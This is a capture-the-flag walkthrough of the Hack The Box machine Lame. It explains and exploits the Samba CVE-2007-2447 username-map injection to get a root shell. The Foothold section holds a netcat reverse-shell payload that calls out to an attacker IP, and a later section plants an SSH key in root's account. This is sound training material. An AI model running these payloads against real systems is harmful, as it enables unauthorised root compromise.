## Overview

Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

The profile is fairly balanced — it leans CTF-like (6.2) and CVE (5.5), reflecting a box solved by a single named CVE (CVE-2007-2447 Samba username-map injection) along a short, guided path, with only moderate enumeration, custom work, and real-life realism around it.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | vsftpd 2.3.4 | anonymous login allowed (backdoor CVE-2011-2523 did not land) |
| 22/tcp | OpenSSH 4.7p1 | Debian 8ubuntu1 |
| 139/tcp | Samba smbd 3.X-4.X | WORKGROUP |
| 445/tcp | Samba smbd 3.0.20-Debian | the intended path |
| 3632/tcp | distccd v1 | GNU 4.2.4 |

A two-stage scan — fast full-port sweep, then version/script scan on the open ports:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.11.167 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.11.167
```

![alt text](/assets/Images/nmap-lame.png)

A default scan (nmap's top 1000 TCP ports) finds **four** open: `21`, `22`, `139`, and `445`. The fifth service, `3632/distccd`, lives outside the top 1000 — which is exactly why the full `-p-` sweep above is needed to surface it. FTP on 21 is **vsftpd 2.3.4**, and the standout is `Samba smbd 3.0.20-Debian` on 445 (Samba version **3.0.20**) — a long-EOL release.

## Enumeration

vsftpd 2.3.4 is famous for a backdoor (a username ending in `:)` opens a root shell on port 6200), and Metasploit ships `exploit/unix/ftp/vsftpd_234_backdoor` for it. **It does not work here.** FTP does allow `anonymous:anonymous`, but the directory is empty and the backdoor exploit fails — we dig into exactly why in the *Beyond root* section below. Move on to SMB.

```bash
smbclient -N -L //10.129.11.167/
```

![Smbclient Lame](/assets/Images/lame-smbclient-2026-06-07_20-48.png)

This lists the shares over a null session (`-N`); `smbclient -L` does the same job as `smbmap -H` without needing smbmap installed/working. The `tmp` share is readable and writable to an anonymous user, confirming guest access is wide open. Browsing it shows only transient junk:

```bash
smbclient -N //10.129.11.167/tmp -c "ls"
```

![Smbclient Lame](/assets/Images/lame-smbclient-2026-06-07_20-52.png)


The version is the real lead. Check for known Samba exploits:

```bash
searchsploit "Samba 3.0.20"
```

This surfaces [*Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution*](https://www.exploit-db.com/exploits/16320), which is **CVE-2007-2447**.

## How CVE-2007-2447 actually works

Before firing anything, it's worth understanding *why* this works — so the exploit is a thing you reason about, not a Metasploit button you press. (This matters for OSCP, where msf is limited to one box.)

Samba can translate an incoming SMB username through an external program, configured in `smb.conf`:

```ini
[global]
   username map script = /etc/samba/scripts/mapuser.sh
```

Every time a client connects, smbd takes the username the client supplied and runs that script to resolve it to a real local account. The bug is in *how* it runs it. In Samba 3.0.20 the client-supplied username is pasted straight into a shell command line with **no sanitisation** — conceptually:

```c
/* simplified from the Samba 3.0.x source */
char *cmd = talloc_asprintf(ctx, "%s %s", username_map_script, client_username);
smbrun(cmd, ...);   /* smbrun() executes the string via /bin/sh -c */
```

`smbrun()` passes the whole string to `/bin/sh -c`, so the shell parses it. If `client_username` contains shell metacharacters — backticks, `$()`, `;`, `|` — the shell executes them. There's no quoting and no allow-list. (The official fix for CVE-2007-2447 simply rejects usernames containing shell metacharacters before building the command.)

Two things make this devastating:

1. **It's pre-auth.** The username is read from the client *before* authentication succeeds — reachable through SMB session-setup and the MS-RPC `SamrChangePassword` call. No valid credentials are ever needed.
2. **smbd runs as root.** Whatever the shell executes runs as root, so this one bug is simultaneously the foothold *and* the privesc.

So instead of supplying a name, we supply a *command disguised as a name*. The `./=` (or `/=`) prefix keeps the token shaped like a username while the backticks carry the payload:

```
./=`nohup nc -e /bin/sh 10.10.14.X 4444`
```

smbd builds `mapuser.sh ./=` + *the output of running our reverse shell*, and the backticked command fires as root.

**What Metasploit's `usermap_script` module does is exactly this and nothing more** — it opens an SMB session and stuffs the same backticked payload into the username field. There's no hidden machinery, which is why we can reproduce it by hand with `smbclient` and skip msfconsole entirely.

## Foothold

No Metasploit needed. Start a listener, open an unauthenticated SMB session, and supply a username whose backticked payload is your reverse shell. The `./=` prefix keeps the string parseable as a username while the backticks run the command.

```bash
# terminal 1: listener
nc -lnvp 4444
```

```bash
# terminal 2: deliver the malicious username over SMB
smbclient -N //10.129.11.167/tmp
# inside smbclient:
logon "./=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

The listener catches a shell. Because smbd runs as root, the username injection executes in a root context — so exploiting CVE-2007-2447 returns a shell as **root**. Confirm and upgrade it:

```bash
id
# uid=0(root) gid=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## User flag

The injected command already runs as root, so the user flag is trivially readable:

```bash
cat /home/makis/user.txt
# [redacted]
```

A single SMB username-injection bug gives a root shell, and the user flag is ours.

## Privilege Escalation

There is no separate privilege-escalation step. smbd runs as **root**, so CVE-2007-2447 already executed in a root context — the shell from the foothold is a root shell (`uid=0(root) gid=0(root)`). The same Samba flaw is simultaneously the foothold and the privesc, which is what makes Lame a one-exploit box.

If you wanted a cleaner, more stable root foothold than the netcat session, the injection can drop an SSH key directly into root's account instead. Stage a small script onto the writable `tmp` share (it maps to `/tmp`), then point the injected username at it:

```sh
#!/bin/sh
mkdir -p /root/.ssh
echo "<attacker-ssh-pubkey>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

```bash
smbclient -N //10.129.11.167/tmp -c 'put root.sh root.sh'
smbclient -N //10.129.11.167/tmp -c 'logon "/=`nohup sh /tmp/root.sh`"'
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group1-sha1 -i root.key root@10.129.11.167
```

OpenSSH 4.7p1 is old enough that a modern client must re-enable the legacy algorithms shown above.

## Root flag

From the root shell, both flags read in one place:

```bash
cat /home/makis/user.txt
# [redacted]
cat /root/root.txt
# [redacted]
```

Full compromise: `root` on Lame from a single unauthenticated Samba exploit — no privilege escalation required.

## Beyond root: why the VSFTPd exploit failed

With a root shell in hand we can answer the question we skipped during enumeration — why didn't the famous vsftpd 2.3.4 backdoor work? (The official writeup stops at root; 0xdf's write-up digs into this.) Our initial nmap only saw four open TCP ports, but from inside the box the picture is very different:

```bash
netstat -tnlp
```

This lists **many more** listening services than nmap found — several bound to `0.0.0.0` and the box's external IP, so on paper they should be reachable from outside. They aren't. What stands between them and us is a **host-based firewall — iptables rules on Lame that drop inbound traffic** to those ports. The services are alive locally; the firewall just hides them from an external scan.

That same firewall is what kills the vsftpd backdoor. The backdoor itself is genuinely present: when triggered (a login username ending in `:)`), vsftpd spawns a root shell bound to **port 6200**. And on Lame it really does fire — trigger it, then check locally:

```bash
# from the root shell, after triggering the backdoor
netstat -tnlp | grep 6200
```

**Port 6200 does start listening** on Lame. The Metasploit module still fails for the same reason all those other ports look closed: iptables blocks the inbound connection to 6200, so your attack host can never reach the bind shell even though it's sitting right there. The backdoor isn't patched — it's firewalled.
